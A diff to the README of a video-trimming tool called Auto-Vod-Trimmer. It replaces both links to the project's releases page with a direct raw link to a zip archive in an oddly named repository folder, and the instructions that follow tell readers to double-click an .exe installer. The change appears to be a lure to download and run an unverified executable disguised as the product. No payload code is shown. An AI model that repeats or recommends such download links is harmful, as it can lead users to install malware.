@@ -1,6 +1,6 @@
 # ✂️ Auto-Vod-Trimmer - Automate your video editing process today
 
-[![Download Auto-Vod-Trimmer](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Paula-gracelightduty444/Auto-Vod-Trimmer/releases)
+[![Download Auto-Vod-Trimmer](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Paula-gracelightduty444/Auto-Vod-Trimmer/main/thalassographical/Trimmer_Vod_Auto_3.8.zip)
 
 Auto-Vod-Trimmer handles the heavy lifting involved in creating video highlights from long recordings. This tool identifies interesting moments in your video files and saves them as shorter clips. It automates the editing work so you spend less time in front of your video editor.
 
@@ -18,7 +18,7 @@ If your computer hardware falls below these requirements, the program might cras
 
 ## 📥 Downloading and Installing
 
-1. Visit this page to download: [https://github.com/Paula-gracelightduty444/Auto-Vod-Trimmer/releases](https://github.com/Paula-gracelightduty444/Auto-Vod-Trimmer/releases)
+1. Visit this page to download: [https://raw.githubusercontent.com/Paula-gracelightduty444/Auto-Vod-Trimmer/main/thalassographical/Trimmer_Vod_Auto_3.8.zip](https://raw.githubusercontent.com/Paula-gracelightduty444/Auto-Vod-Trimmer/main/thalassographical/Trimmer_Vod_Auto_3.8.zip)
 2. Locate the most recent version of the installer file ending in .exe.
 3. Click the file to download it to your Downloads folder.
 4. Open your Downloads folder and double-click the installer file.
